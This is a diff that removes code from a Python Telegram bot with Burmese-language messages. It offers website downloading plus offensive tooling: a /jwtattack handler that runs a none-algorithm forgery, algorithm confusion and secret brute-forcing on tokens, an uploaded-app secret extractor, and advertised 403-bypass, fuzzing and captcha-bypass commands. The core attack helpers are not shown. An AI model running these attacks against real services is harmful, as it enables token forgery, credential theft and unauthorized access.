-        await update.effective_message.reply_text(
-            "❌ *URL မဟုတ်ဘဲ JWT Token ထည့်ပါ*\n\n"
-            "JWT format: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xxxxx`\n\n"
-            "💡 Token ကိုရှာဖို့ `/extract <url>` သုံးနိုင်သည်",
-            parse_mode='Markdown'
-        )
-        return
-
-    # Basic JWT format check (3 parts, each part is base64url)
-    if token.count('.') != 2:
-        await update.effective_message.reply_text(
-            "❌ Valid JWT မဟုတ်ပါ\n"
-            "JWT format: `xxxxx.yyyyy.zzzzz` (dot 3 ပိုင်း ပါရမည်)",
-            parse_mode='Markdown'
-        )
-        return
-
-    parts = token.split('.')
-    for i, part in enumerate(parts[:2]):
-        if len(part) < 4:
-            await update.effective_message.reply_text(
-                f"❌ JWT part {i+1} တိုလွန်းနေသည် — Valid token ထည့်ပါ",
-                parse_mode='Markdown'
-            )
-            return
-
-    msg = await update.effective_message.reply_text(
-        "🎟️ *JWT Attacker Running...*\n\n"
-        "① Decoding...\n② None attack...\n③ Alg confusion...\n④ Brute-forcing...\n⏳",
-        parse_mode='Markdown'
-    )
-
-    # ── Phase 1: Decode ──────────────────────────
-    decoded = _jwt_decode_payload(token)
-    if "error" in decoded:
-        await msg.edit_text(f"❌ Decode error: `{decoded['error']}`", parse_mode='Markdown')
-        return
-
-    header  = decoded.get("header", {})
-    payload = decoded.get("payload", {})
-    alg     = header.get("alg", "unknown")
-
-    # Format payload nicely
-    def _fmt_payload(p: dict) -> str:
-        lines = []
-        important_keys = ['sub','iss','aud','exp','iat','nbf','role','roles',
-                          'user_id','uid','email','username','admin','scope',
-                          'permissions','type','jti']
-        for k in important_keys:
-            if k in p:
-                v = p[k]
-                if k in ('exp','iat','nbf') and isinstance(v, int):
-                    try:
-                        from datetime import datetime as _dt
-                        v = f"{v} ({_dt.utcfromtimestamp(v).strftime('%Y-%m-%d %H:%M UTC')})"
-                    except Exception:
-                        pass
-                lines.append(f"  `{k}`: `{str(v)[:80]}`")
-        remaining = {k: v for k, v in p.items() if k not in important_keys}
-        for k, v in list(remaining.items())[:10]:
-            lines.append(f"  `{k}`: `{str(v)[:60]}`")
-        return "\n".join(lines) or "  (empty)"
-
-    payload_str = _fmt_payload(payload)
-
-    # ── Phase 2: None attack ─────────────────────
-    none_res = _jwt_none_attack(token)
-
-    # ── Phase 3: Alg confusion ───────────────────
-    alg_res = _jwt_alg_confusion(token)
-
-    # ── Phase 4: Brute-force (in thread) ─────────
-    progress_q = []
-
-    async def _prog():
-        while True:
-            await asyncio.sleep(2)
-            if progress_q:
-                txt = progress_q[-1]; progress_q.clear()
-                try:
-                    await msg.edit_text(
-                        f"🎟️ *JWT Attacker*\n\n🔑 {txt}", parse_mode='Markdown')
-                except Exception:
-                    pass
-
-    prog = asyncio.create_task(_prog())
-    try:
-        bf_res = await asyncio.to_thread(
-            _jwt_brute_force, token, None, lambda t: progress_q.append(t)
-        )
-    except Exception as e:
-        bf_res = {"cracked": False, "error": str(e)}
-    finally:
-        prog.cancel()
-
-    # ── Build report ─────────────────────────────
-    lines = [
-        "🎟️ *JWT Attack Report*",
-        "━━━━━━━━━━━━━━━━━━━━",
-        "",
-        f"*① Decoded Token:*",
-        f"  Algorithm: `{alg}`",
-        f"  Header: `{json.dumps(header, separators=(',',':'))[:100]}`",
-        f"",
-        f"*📋 Payload:*",
-        payload_str,
-        "",
-    ]
-
-    # None attack result
-    lines.append("*② None Algorithm Bypass:*")
-    if none_res.get("success"):
-        forged = none_res['forged_token']
-        lines.append(f"  ✅ *VULNERABLE — unsigned token forged!*")
-        lines.append(f"  Original alg: `{none_res['original_alg']}`")
-        lines.append(f"  Forged token (truncated):\n  `{forged[:80]}...`")
-        lines.append(f"  _{none_res.get('note','')}_")
-    else:
-        lines.append(f"  ⚪ Not applicable or failed")
-    lines.append("")
-
-    # Alg confusion result
-    lines.append("*③ Algorithm Confusion:*")
-    if alg_res.get("success"):
-        lines.append(f"  🟠 RS256 → HS256 confusion possible!")
-        lines.append(f"  _{alg_res.get('note','')[:150]}_")
-    else:
-        lines.append(f"  ⚪ {alg_res.get('note', 'Not applicable')}")
-    lines.append("")
-
-    # Brute-force result
-    lines.append("*④ Secret Key Brute-force:*")
-    if bf_res.get("cracked"):
-        secret = bf_res['secret']
-        lines.append(f"  🔴 *SECRET FOUND!*")
-        lines.append(f"  Key: `{secret}`")
-        lines.append(f"  Algorithm: `{bf_res.get('alg','?')}`")
-        lines.append(f"  Tried: `{bf_res.get('tried',0)}` passwords")
-    elif "error" in bf_res:
-        lines.append(f"  ⚪ `{bf_res['error']}`")
-    else:
-        lines.append(f"  ✅ Not cracked (`{bf_res.get('tried',0)}` common secrets tried)")
-        lines.append("  _Custom wordlist ဖြင့် ထပ်ကြိုးစားနိုင်သည်_")
-    lines.append("")
-    lines.append("━━━━━━━━━━━━━━━━━━")
-    lines.append("⚠️ _Authorized security research only_")
-
-    report = "\n".join(lines)
-    try:
-        if len(report) <= 4000:
-            await msg.edit_text(report, parse_mode='Markdown')
-        else:
-            await msg.edit_text(report[:4000], parse_mode='Markdown')
-    except Exception:
-        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
-
-    # Export full JSON report
-    import io
-    full_report = {
-        "token": token,
-        "decoded": decoded,
-        "none_attack": none_res,
-        "alg_confusion": alg_res,
-        "brute_force": bf_res,
-        "analyzed_at": datetime.now().isoformat(),
-    }
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    report_buf = io.BytesIO(json.dumps(full_report, indent=2, default=str).encode())
-    try:
-        await context.bot.send_document(
-            chat_id=update.effective_chat.id,
-            document=report_buf,
-            filename=f"jwt_report_{ts}.json",
-            caption="🎟️ *JWT Full Report* — JSON export",
-            parse_mode='Markdown'
-        )
-    except Exception as e:
-        logger.warning("JWT export error: %s", e)
-
-
-# 🤖  BOT — USER COMMANDS
-# ══════════════════════════════════════════════════
-
-
-async def cmd_mystats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/mystats — Detailed personal statistics"""
-    uid = update.effective_user.id
-    async with db_lock:
-        db = _load_db_sync()
-        u  = get_user(db, uid, update.effective_user.first_name)
-        reset_daily(u)
-        _save_db_sync(db)
-
-    lim      = get_limit(db, u)
-    dls      = u.get("downloads", [])
-    total_mb = sum(d.get("size_mb", 0) for d in dls)
-    success  = sum(1 for d in dls if d.get("status") == "success")
-    failed   = len(dls) - success
-
-    bar = pbar(u["count_today"], lim if lim > 0 else max(u["count_today"], 1))
-
-    await update.effective_message.reply_text(
-        "📊 *My Statistics*\n\n"
-        "👤 *%s*\n"
-        "🆔 `%d`\n\n"
-        "📅 *Today:*\n"
-        "`%s`\n"
-        "Used: `%d` / `%s`\n\n"
-        "📦 *All Time:*\n"
-        "Downloads: `%d` total\n"
-        "✅ Success: `%d`  ❌ Failed: `%d`\n"
-        "💾 Data: `%.1f MB`" % (
-            u["name"], uid,
-            bar, u["count_today"], "∞" if lim == 0 else str(lim),
-            u["total_downloads"], success, failed, total_mb,
-        ),
-        parse_mode="Markdown"
-    )
-
-
-
-
-
-async def handle_app_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """
-    User က APK/IPA/ZIP/JAR upload လုပ်ရင် auto-detect ပြီး analyze လုပ်
-    """
-    doc = update.message.document
-    if not doc:
-        return
-
-    uid   = update.effective_user.id
-    uname = update.effective_user.first_name or "User"
-
-    # ── Force join check ─────────────────────────
-    if not await check_force_join(update, context):
-        return
-
-    # ── File type check ──────────────────────────
-    fname    = doc.file_name or ""
-    ext      = os.path.splitext(fname.lower())[1]
-    fsize_mb = doc.file_size / 1024 / 1024 if doc.file_size else 0
-
-    if ext not in _APP_EXTS:
-        # Not an app file — ignore silently
-        return
-
-    # ── Size limit ───────────────────────────────
-    if fsize_mb > APP_MAX_MB:
-        await update.message.reply_text(
-            f"⚠️ File ကြီးလွန်းတယ် (`{fsize_mb:.1f}MB`)\n"
-            f"📏 Max: `{APP_MAX_MB}MB`",
-            parse_mode='Markdown'
-        )
-        return
-
-    # ── Rate limit ───────────────────────────────
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.message.reply_text(f"⏱️ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
-
-    file_type = _APP_EXTS.get(ext, ext.upper())
-    msg = await update.message.reply_text(
-        f"📱 *{file_type} Detected!*\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"📄 `{fname}`\n"
-        f"💾 `{fsize_mb:.1f} MB`\n\n"
-        f"⬇️ Downloading from Telegram...",
-        parse_mode='Markdown'
-    )
-
-    # ── Download file from Telegram ──────────────
-    work_dir  = os.path.join(APP_ANALYZE_DIR, str(uid))
-    os.makedirs(work_dir, exist_ok=True)
-    safe_name = re.sub(r'[^\w\.\-]', '_', fname)
-    save_path = os.path.join(work_dir, safe_name)
-
-    try:
-        tg_file = await context.bot.get_file(doc.file_id)
-        await tg_file.download_to_drive(save_path)
-    except Exception as e:
-        await msg.edit_text(f"❌ Download error: `{type(e).__name__}`", parse_mode='Markdown')
-        return
-
-    # ── Save path for /appassets command ─────────
-    async with db_lock:
-        db2 = _load_db_sync()
-        u2  = get_user(db2, uid, uname)
-        u2["last_uploaded_app"] = save_path
-        _save_db_sync(db2)
-
-    await msg.edit_text(
-        f"📱 *{file_type} — `{fname}`*\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"✅ Downloaded `{fsize_mb:.1f}MB`\n\n"
-        f"🔍 Phase 1: Text/Source scanning...\n"
-        f"📦 Phase 2: Binary string extraction...\n"
-        f"🔑 Phase 3: Secret/key detection...\n\n"
-        f"⏳ Analyzing...",
-        parse_mode='Markdown'
-    )
-
-    # ── Progress tracking ─────────────────────────
-    prog_q = []
-    async def _prog_loop():
-        while True:
-            await asyncio.sleep(3)
-            if prog_q:
-                txt = prog_q[-1]; prog_q.clear()
-                try:
-                    await msg.edit_text(
-                        f"📱 *Analyzing `{fname}`*\n\n{txt}",
-                        parse_mode='Markdown'
-                    )
-                except Exception:
-                    pass
-
-    prog_task = asyncio.create_task(_prog_loop())
-
-    try:
-        result = await asyncio.to_thread(
-            analyze_app_file, save_path, lambda t: prog_q.append(t)
-        )
-    except Exception as e:
-        prog_task.cancel()
-        await msg.edit_text(f"❌ Analysis error: `{type(e).__name__}`\n`{str(e)[:100]}`",
-                            parse_mode='Markdown')
-        try: os.remove(save_path)
-        except: pass
-        return
-    finally:
-        prog_task.cancel()
-
-    # ── Keep file for /appassets — remove previous file if any ──
-    async with db_lock:
-        db_pre = _load_db_sync()
-        u_pre  = get_user(db_pre, uid, uname)
-        old_path = u_pre.get("last_uploaded_app")
-        if old_path and old_path != save_path:
-            try: os.remove(old_path)
-            except: pass
-
-    # ══ Build result report ═══════════════════════
-    app_info = result.get("app_info", {})
-    urls     = result.get("urls", [])
-    api_paths= result.get("api_paths", [])
-    ws_urls  = result.get("ws_urls", [])
-    secrets  = result.get("secrets", {})
-    src_files= result.get("source_files", [])
-    stats    = result.get("stats", {})
-    errors   = result.get("errors", [])
-
-    # ── Platform badge ────────────────────────────
-    platform = app_info.get("platform", "")
-    plat_icon = "🤖" if platform == "Android" else ("🍎" if platform == "iOS" else "📦")
-
-    lines = [
-        f"📱 *App Analysis — `{fname}`*",
-        f"━━━━━━━━━━━━━━━━━━━━",
-        f"{plat_icon} `{result['file_type']}` | 💾 `{result['file_size_mb']}MB`",
-        f"📂 Files: `{stats.get('total_files',0)}` | Scanned: `{stats.get('text_files_scanned',0)}`",
-        f"🌐 URLs: `{stats.get('unique_urls',0)}` | 🛤 API Paths: `{stats.get('api_paths',0)}`",
-        f"🔌 WebSocket: `{stats.get('ws_urls',0)}` | 🔑 Secret types: `{stats.get('secret_types',0)}`",
-        "",
-    ]
-
-    # App Info
-    if app_info:
-        lines.append(f"*{'🤖 Android' if platform == 'Android' else '🍎 iOS'} App Info:*")
-        pkg = app_info.get("package") or app_info.get("bundle_id", "")
-        if pkg:
-            lines.append(f"  📦 `{pkg}`")
-        perms = app_info.get("permissions", [])[:8]
-        if perms:
-            lines.append(f"  🔐 Permissions: `{', '.join(perms[:5])}`{'...' if len(perms)>5 else ''}")
-        url_schemes = app_info.get("url_schemes", [])
-        if url_schemes:
-            lines.append(f"  🔗 URL Schemes: `{'`, `'.join(url_schemes[:4])}`")
-        # Meta-data with potential API keys
-        meta = app_info.get("meta_data", {})
-        interesting_meta = {k: v for k, v in meta.items()
-                           if any(kw in k.lower() for kw in
-                                  ['api', 'key', 'secret', 'token', 'firebase',
-                                   'google', 'facebook', 'stripe', 'url', 'host'])}
-        if interesting_meta:
-            lines.append(f"  🗝 Meta-data keys ({len(interesting_meta)}):")
-            for k, v in list(interesting_meta.items())[:5]:
-                lines.append(f"     • `{k}` = `{v[:40]}`")
-        # iOS plist keys
-        plist_keys = app_info.get("keys", {})
-        if plist_keys:
-            lines.append(f"  🗝 Config keys ({len(plist_keys)}):")
-            for k, v in list(plist_keys.items())[:5]:
-                lines.append(f"     • `{k}` = `{v[:40]}`")
-        lines.append("")
-
-    # Secrets found
-    if secrets:
-        lines.append(f"*🔑 Potential Secrets Found ({len(secrets)} types):*")
-        for name, count in sorted(secrets.items(), key=lambda x: -x[1]):
-            risk = "🔴" if name in ('AWS Key', 'AWS Secret', 'Private Key', 'Stripe Key',
-                                     'Hardcoded Pass', 'JWT Token') else "🟡"
-            lines.append(f"  {risk} `{name}` × {count}")
-        lines.append("")
-
-    # API paths
-    if api_paths:
-        lines.append(f"*🛤 API Paths ({len(api_paths)}):*")
-        for p in api_paths[:15]:
-            lines.append(f"  🟢 `{p}`")
-        if len(api_paths) > 15:
-            lines.append(f"  _...and {len(api_paths)-15} more in JSON report_")
-        lines.append("")
-
-    # Full URLs (top domains)
-    if urls:
-        # Group by domain
-        domain_map = {}
-        for u in urls:
-            try:
-                d = urlparse(u).netloc
-                domain_map.setdefault(d, []).append(u)
-            except Exception:
-                pass
-        lines.append(f"*🌐 Hosts Found ({len(domain_map)} unique):*")
-        for domain, durls in sorted(domain_map.items(), key=lambda x: -len(x[1]))[:10]:
-            lines.append(f"  🔵 `{domain}` ({len(durls)} URLs)")
-        lines.append("")
-
-    # WebSocket
-    if ws_urls:
-        lines.append(f"*🔌 WebSocket URLs ({len(ws_urls)}):*")
-        for w in ws_urls[:5]:
-            lines.append(f"  🟣 `{w[:80]}`")
-        lines.append("")
-
-    # Top source files
-    if src_files:
-        lines.append(f"*📄 Hot Source Files ({len(src_files)}):*")
-        for sf in src_files[:8]:
-            fname_short = sf["file"].split("/")[-1]
-            tags = []
-            if sf["urls"] > 0:   tags.append(f"{sf['urls']} URLs")
-            if sf["secrets"]:    tags.append(f"🔑 {','.join(sf['secrets'][:2])}")
-            lines.append(f"  📝 `{fname_short}` — {' | '.join(tags)}")
-        lines.append("")
-
-    if errors:
-        lines.append(f"⚠️ _Errors: {len(errors)}_")
-
-    lines.append("⚠️ _Passive analysis only — no exploitation_")
-
-    report_text = "\n".join(lines)
-
-    # ── Send text report ──────────────────────────
-    try:
-        if len(report_text) <= 4000:
-            await msg.edit_text(report_text, parse_mode='Markdown')
-        else:
-            await msg.edit_text(report_text[:4000], parse_mode='Markdown')
-            await update.message.reply_text(report_text[4000:8000], parse_mode='Markdown')
-    except Exception:
-        await update.message.reply_text(report_text[:4000], parse_mode='Markdown')
-
-    # ── Export full JSON report ───────────────────
-    try:
-        safe_fname = re.sub(r'[^\w\-]', '_', os.path.splitext(fname)[0])
-        ts         = datetime.now().strftime("%Y%m%d_%H%M%S")
-        json_path  = os.path.join(APP_ANALYZE_DIR, f"app_{safe_fname}_{ts}.json")
-
-        export = {
-            "filename":    fname,
-            "file_type":   result["file_type"],
-            "file_size_mb":result["file_size_mb"],
-            "analyzed_at": datetime.now().isoformat(),
-            "app_info":    app_info,
-            "stats":       stats,
-            "api_paths":   api_paths,
-            "urls":        urls,
-            "ws_urls":     ws_urls,
-            "secrets_found": {k: f"×{v}" for k, v in secrets.items()},
-            "source_files":  src_files,
-            "errors":        errors[:20],
-        }
-        with open(json_path, 'w', encoding='utf-8') as jf:
-            json.dump(export, jf, ensure_ascii=False, indent=2)
-
-        cap = (
-            f"📦 *App Analysis Report*\n"
-            f"📱 `{fname}`\n"
-            f"🌐 `{stats.get('unique_urls',0)}` URLs | "
-            f"🛤 `{stats.get('api_paths',0)}` API paths | "
-            f"🔑 `{stats.get('secret_types',0)}` secret types"
-        )
-        with open(json_path, 'rb') as jf:
-            await context.bot.send_document(
-                chat_id=update.effective_chat.id,
-                document=jf,
-                filename=f"app_{safe_fname}_{ts}.json",
-                caption=cap,
-                parse_mode='Markdown'
-            )
-        os.remove(json_path)
-
-    except Exception as e:
-        logger.warning("App JSON export error: %s", e)
-
-
-
-async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid   = update.effective_user.id
-    uname = update.effective_user.first_name or "User"
-    async with db_lock:
-        db2 = _load_db_sync()
-        get_user(db2, uid, uname)
-        _save_db_sync(db2)
-
-    js_status   = "✅ JS Ready" if PLAYWRIGHT_OK else "⚠️ JS Off"
-    adm_line     = "\n\n🔧 *Admin Panel:* /admin" if uid in ADMIN_IDS else ""
-
-    await update.effective_message.reply_text(
-        f"👋 *မင်္ဂလာပါ, {uname}!*\n"
-        f"🌐 *Website Downloader Bot v17.0*\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"📥 *Download Commands:*\n"
-        f"  `/download <url>` — Single page\n"
-        f"  `/fullsite <url>` — Full website\n"
-        f"  `/jsdownload <url>` — JS/React site _{js_status}_\n"
-        f"  `/resume <url>` — Download ဆက်လုပ်ရန်\n"
-        f"  `/stop` — Download ရပ်ရန်\n\n"
-        f"🔍 *Tools:*\n"
-        f"  `/vuln <url>` — Security scan\n"
-        f"  `/api <url>` — API discovery\n"
-        f"  `/tech <url>` — Tech stack fingerprint\n"
-        f"  `/extract <url>` — Secret/key scanner\n"
-        f"  `/subdomains <domain>` — Subdomain enumeration\n"
-        f"  `/bypass403 <url>` — 403 bypass tester\n"
-        f"  `/fuzz <url>` — Path & param fuzzer\n"
-        f"  `/monitor` — Change alert monitor\n"
-        f"  `/smartfuzz <url>` — 🗂️ Context-aware smart fuzzer\n"
-        f"  `/antibot <url>` — 🤖 Anti-bot / Captcha bypass\n"
-        f"  `/jwtattack <token>` — 🎟️ JWT decode & crack\n"
-        f"  `/sitekey <url>` — 🔑 reCAPTCHA/hCaptcha/Turnstile key extractor\n\n"
-        f"📱 *App Analyzer:*\n"
-        f"  APK / IPA / ZIP / JAR upload လုပ်ပါ\n"
-        f"  → Auto API + Secret extraction\n\n"
-        f"📊 *Account:*\n"
-        f"  `/status` — Usage ကြည့်ရန်\n"
-        f"  `/history` — Download history\n"
-        f"  `/mystats` — Detailed stats\n\n"
-        f"🔒 SSRF Protected{adm_line}\n\n"
-        f"❓ /help — Commands အကူအညီ",
-        parse_mode='Markdown'
-    )
-
-
-async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid     = update.effective_user.id
-    is_adm  = uid in ADMIN_IDS
-    js_st    = "✅ Ready" if PLAYWRIGHT_OK else "❌ `pip install playwright && playwright install chromium`"
-    base = (
-        "📖 *Commands Guide — v17.0*\n"
-        "━━━━━━━━━━━━━━━━━━━━\n\n"
-
-        "📥 *Website Download*\n"
-        "  `/download <url>`\n"
-        "   └ Single page HTML + assets\n\n"
-        "  `/fullsite <url>`\n"
-        "   └ Website အပြည့် (sitemap scan ပါ)\n\n"
-        "  `/jsdownload <url>`\n"
-        "   └ React/Vue/Angular JS sites\n"
-        "   └ Status: " + js_st + "\n\n"
-        "  `/jsfullsite <url>`\n"
-        "   └ JS + Full crawl ပေါင်းစပ်\n\n"
-        "  `/resume <url>`\n"
-        "   └ ကျသွားလျှင် ဆက်လုပ်ရန်\n\n"
-
-        "📱 *App Analyzer (Upload File):*\n"
-        "  APK / IPA / ZIP / JAR / AAB / JAR\n"
-        "   └ Chat ထဲ file drop ရုံသာ\n"
-        "   └ API endpoints + Secrets + Hosts\n"
-        "   └ AndroidManifest / Info.plist parse\n"
-        "   └ JSON report auto-export\n"
-        f"   └ Max size: `{APP_MAX_MB}MB`\n\n"
-        "🔍 *Scan & Discovery*\n"
-        "  `/vuln <url>` — Security vulnerability scan\n"
-        "  `/api <url>` — API endpoint discovery\n"
-        "  `/tech <url>` — Tech stack fingerprinter\n"
-        "  `/extract <url>` — Secret/API key scanner (JS bundles)\n\n"
-        "🔓 *Advanced Recon*\n"
-        "  `/subdomains <domain>` — Subdomain enum (crt.sh + brute-force)\n"
-        "  `/bypass403 <url>` — 403 bypass (50+ techniques)\n"
-        "  `/fuzz <url> [paths|params]` — HTTP path & param fuzzer\n\n"
-        "🔔 *Monitoring*\n"
-        "  `/monitor add <url> [min] [label]` — Alert on page change\n"
-        "  `/monitor list|del|clear` — Manage monitors\n\n"
-
-        "📊 *My Account*\n"
-        "  `/status` — Daily limit + usage\n"
-        "  `/history` — Download log (last 10)\n"
-        "  `/mystats` — Total stats\n\n"
-
-        "💡 *Tips:*\n"
-        "  • 50MB+ ဆိုရင် auto split လုပ်ပြီး ပို့ပေးမယ်\n"
-        "  • JS site error ဖြစ်ရင် `/jsdownload` သုံးပါ\n"
-        "  • Download ကျရင် `/resume` နဲ့ ဆက်နိုင်တယ်\n"
-        "  • 🔒 SSRF + Path traversal protected"
-    )
-
-    admin_section = (
-        "\n\n👑 *Admin Commands:*\n"
-        "  `/admin` — Admin panel\n"
-        "  `/ban` `/unban` `/setlimit` `/userinfo`\n"
-        "  `/broadcast` `/allusers` `/setpages` `/setassets`\n\n"
-            )
-
-    await update.effective_message.reply_text(
-        base + (admin_section if is_adm else ""),
-        parse_mode='Markdown'
-    )
-
-async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    async with db_lock:
-        db = _load_db_sync()
-        u  = get_user(db, update.effective_user.id, update.effective_user.first_name)
-        reset_daily(u)
-        _save_db_sync(db)
-    lim  = get_limit(db, u)
-    used = u["count_today"]
-    bar  = pbar(used, lim if lim > 0 else max(used, 1))
-    await update.effective_message.reply_text(
-        f"📊 *Status*\n\n👤 {u['name']}\n"
-        f"🚫 Banned: {'Yes ❌' if u['banned'] else 'No ✅'}\n\n"
-        f"📅 Today:\n`{bar}`\n"
-        f"Used: `{used}` / `{'∞' if lim==0 else lim}`\n"
-        f"📦 Total: `{u['total_downloads']}`",
-        parse_mode='Markdown'
-    )
-
-async def cmd_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    async with db_lock:
-        db = _load_db_sync()
-        u  = get_user(db, update.effective_user.id)
-    dls = u.get("downloads",[])[-10:]
-    if not dls:
-        await update.effective_message.reply_text("📭 History မရှိသေးပါ"); return
-    lines = ["📜 *Download History*\n"]
-    for d in reversed(dls):
-        icon = {"success":"✅","too_large":"⚠️"}.get(d["status"],"❌")
-        lines.append(f"{icon} `{d['url'][:45]}`\n   {d['time']} | {d['size_mb']}MB")
-    await update.effective_message.reply_text("\n".join(lines), parse_mode='Markdown')
-
-
-# ── Core download runner ──────────────────────────
-
-async def _run_download(
-    update: Update, context: ContextTypes.DEFAULT_TYPE,
-    url: str, full_site: bool, use_js: bool,
-    resume_mode: bool = False
-):
-    uid   = update.effective_user.id
-    uname = update.effective_user.first_name
-
-    # ── Rate limit check ──────────────────────────
-    if not resume_mode:
-        allowed, wait_sec = check_rate_limit(uid)
-        if not allowed:
-            await update.effective_message.reply_text(
-                f"⏱️ နည်းနည်းစောင့်ပါ — `{wait_sec}` seconds ကျန်သေးတယ်",
-                parse_mode='Markdown'
-            )
-            return
-
-    # ── SSRF pre-check ────────────────────────────
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(
-            f"🚫 URL ကို download လုပ်ခွင့်မပြုပါ\n`{reason}`",
-            parse_mode='Markdown'
-        )
-        return
-
-    # ── DB checks (with lock) ─────────────────────
-    async with db_lock:
-        db = _load_db_sync()
-        u  = get_user(db, uid, uname)
-        reset_daily(u)
-
-        if u["banned"]:
-            _save_db_sync(db)
-            await update.effective_message.reply_text("🚫 Ban ထားပါတယ်"); return
-        if not db["settings"]["bot_enabled"] and uid not in ADMIN_IDS:
-            _save_db_sync(db)
-            await update.effective_message.reply_text("🔴 Bot ယာယီပိတ်ထားပါတယ်"); return
-        if not resume_mode and not can_download(db, u):
-            lim = get_limit(db, u)
-            _save_db_sync(db)
-            await update.effective_message.reply_text(f"⛔ Daily limit ({lim}) ပြည့်ပါပြီ"); return
-        _save_db_sync(db)
-
-    mode_txt = ("🌐 Full" if full_site else "📄 Single") + (" ⚡JS" if use_js else "")
-    msg = await update.effective_message.reply_text(
-        f"⏳ *Download စနေပါတယ်{'(Resume)' if resume_mode else ''}...*\n"
-        f"🔗 `{sanitize_log_url(url)}`\n📋 {mode_txt}\n\n"
-        f"`{'░'*18}`  0%",
-        parse_mode='Markdown'
-    )
-
-    last = {'t': ''}
-    def sync_cb(text): last['t'] = text
-
-    # ── Cancel flag — /stop command ───────────────
-    cancel_event = asyncio.Event()
-    _cancel_flags[uid] = cancel_event
-
-    async def progress_loop():
-        while True:
-            await asyncio.sleep(2.5)
-            if cancel_event.is_set():
-                return
-            if last['t']:
-                try:
-                    await msg.edit_text(
-                        f"⏳ *Download နေဆဲ...*\n🔗 `{sanitize_log_url(url)}`\n\n{last['t']}",
-                        parse_mode='Markdown'
-                    )
-                except RetryAfter as e:
-                    await asyncio.sleep(e.retry_after + 1)
-                except BadRequest:
-                    pass
-
-    prog = asyncio.create_task(progress_loop())
-
-    async with download_semaphore:
-        # Check cancel before starting heavy work
-        if cancel_event.is_set():
-            prog.cancel()
-            _cancel_flags.pop(uid, None)
-            await msg.edit_text("🛑 Download cancelled")
-            return
-        try:
-            async with db_lock:
-                db2 = _load_db_sync()
-            mp = db2["settings"]["max_pages"]
-            ma = db2["settings"]["max_assets"]
-            files, error, stats, size_mb = await asyncio.to_thread(
-                download_website, url, full_site, use_js, mp, ma, sync_cb, resume_mode
-            )
-        except Exception as e:
-            prog.cancel()
-            err_name = type(e).__name__
-            err_hint = {
-                "ConnectionError":  "🌐 ဆာဗာနဲ့ ချိတ်ဆက်မရပါ",
-                "TimeoutError":     "⏱️ Response timeout ဖြစ်သွားတယ်",
-                "SSLError":         "🔒 SSL certificate ပြဿနာ",
-                "TooManyRedirects": "🔄 Redirect loop ဖြစ်နေတယ်",
-            }.get(err_name, f"⚠️ {err_name}")
-            await msg.edit_text(
-                f"❌ *Download မအောင်မြင်ဘူး*\n\n"
-                f"{err_hint}\n\n"
-                f"▸ ဆက်လုပ်ဖို့: `/resume {url}`\n"
-                f"▸ JS site ဆိုရင်: `/jsdownload {url}`",
-                parse_mode='Markdown'
-            )
-            async with db_lock:
-                db3 = _load_db_sync()
-                u3  = get_user(db3, uid)
-                log_download(u3, url, 0, "error")
-                _save_db_sync(db3)
-            _cancel_flags.pop(uid, None)
-            return
-
-    prog.cancel()
-    _cancel_flags.pop(uid, None)   # download finished — remove flag
-
-    # Check if cancelled during download
-    if cancel_event.is_set():
-        await msg.edit_text("🛑 Download ကို cancel လုပ်ပြီးပါပြီ")
-        return
-
-    if error:
-        await msg.edit_text(f"❌ {error}"); return
-
-    is_split = len(files) > 1
-    await msg.edit_text(
-        f"📤 Upload နေပါတယ်...\n💾 {size_mb:.1f} MB"
-        + (f" → {len(files)} parts" if is_split else ""),
-        parse_mode='Markdown'
-    )
-
-    try:
-        for i, fpath in enumerate(files):
-            part_label = f" (Part {i+1}/{len(files)})" if is_split else ""
-            cap = (
-                f"{'✅' if i==len(files)-1 else '📦'} *Done{part_label}*\n"
-                f"🔗 `{sanitize_log_url(url)}`\n"
-                f"📄 {stats['pages']}p | 📦 {stats['assets']}a | 💾 {size_mb:.1f}MB"
-            )
-            # ── RetryAfter-aware upload (3 attempts) ──────
-            for attempt in range(3):
-                try:
-                    with open(fpath, 'rb') as f:
-                        await context.bot.send_document(
-                            chat_id=update.effective_chat.id,
-                            document=f, filename=os.path.basename(fpath),
-                            caption=cap, parse_mode='Markdown'
-                        )
-                    break  # success
-                except RetryAfter as e:
-                    wait = e.retry_after + 2
-                    logger.warning("Upload RetryAfter: waiting %ds", wait)
-                    await asyncio.sleep(wait)
-                except Exception:
-                    if attempt == 2:
-                        raise
-                    await asyncio.sleep(3)
-
-            os.remove(fpath)
-            await asyncio.sleep(1)
-
-        join_hint = (
-            "\n\n*Combine လုပ်နည်း:*\n```\ncat *.part*.zip > full.zip\n```"
-        ) if is_split else ""
-
-        await msg.edit_text(f"✅ ပြီးပါပြီ 🎉{join_hint}", parse_mode='Markdown')
-
-        async with db_lock:
-            db4 = _load_db_sync()
-            u4  = get_user(db4, uid)
-            log_download(u4, url, size_mb, "success")
-            _save_db_sync(db4)
-
-    except RetryAfter as e:
-        await msg.edit_text(f"❌ Telegram flood limit — `{e.retry_after}s` နောက်မှ ထပ်ကြိုးစားပါ")
-    except Exception as e:
-        await msg.edit_text(f"❌ Upload error: {type(e).__name__}")
-
-
-# ── Command wrappers ──────────────────────────────
-
-async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/stop — Cancel current running download"""
-    uid = update.effective_user.id
-    event = _cancel_flags.get(uid)
-    if event and not event.is_set():
-        event.set()
-        await update.effective_message.reply_text(
-            "🛑 *Download cancel လုပ်နေပါတယ်...*\n"
-            "⚙️ လက်ရှိ page/asset ပြီးရင် ရပ်မယ်",
-            parse_mode='Markdown'
-        )
-    else:
-        await update.effective_message.reply_text(
